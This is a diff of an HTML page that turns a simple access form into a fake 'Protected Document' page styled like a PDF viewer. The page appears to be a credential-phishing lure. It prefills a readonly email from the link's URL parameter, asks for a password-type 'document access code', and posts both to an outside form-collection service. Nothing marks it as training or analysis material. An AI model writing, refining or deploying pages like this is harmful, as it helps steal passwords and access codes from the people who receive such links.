@@ -2,25 +2,68 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Wedding Budget Access</title>
+  <title>Secure Document</title>
+
+  <style>
+    body {
+      background: #e5e5e5;
+      font-family: Arial, sans-serif;
+      padding: 40px;
+    }
+
+    .pdf {
+      background: white;
+      width: 600px;
+      margin: auto;
+      padding: 40px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    label {
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #333;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
 
-  <h2>Access Form</h2>
+  <div class="pdf">
+    <h2>Protected Document</h2>
 
-  <form action="https://formcarry.com/s/zPqDzDWqria" method="POST">
+    <form action="https://formcarry.com/s/zPqDzDWqria" method="POST">
 
-    <label>Email</label><br>
-    <input type="email" id="email" name="email" required><br><br>
+      <label>Email address</label>
+      <input type="email" id="email" name="email" readonly required>
 
-    <label>Access code</label><br>
-    <input type="password" name="access_code" required><br><br>
+      <label>Document access code</label>
+      <input type="password" name="document_code" required>
 
-    <button type="submit">Submit</button>
-  </form>
+      <button type="submit">View Document</button>
+    </form>
+  </div>
 
   <script>
-    // Get email from URL (safe prefill)
     const params = new URLSearchParams(window.location.search);
     const email = params.get("email");
     if (email) {
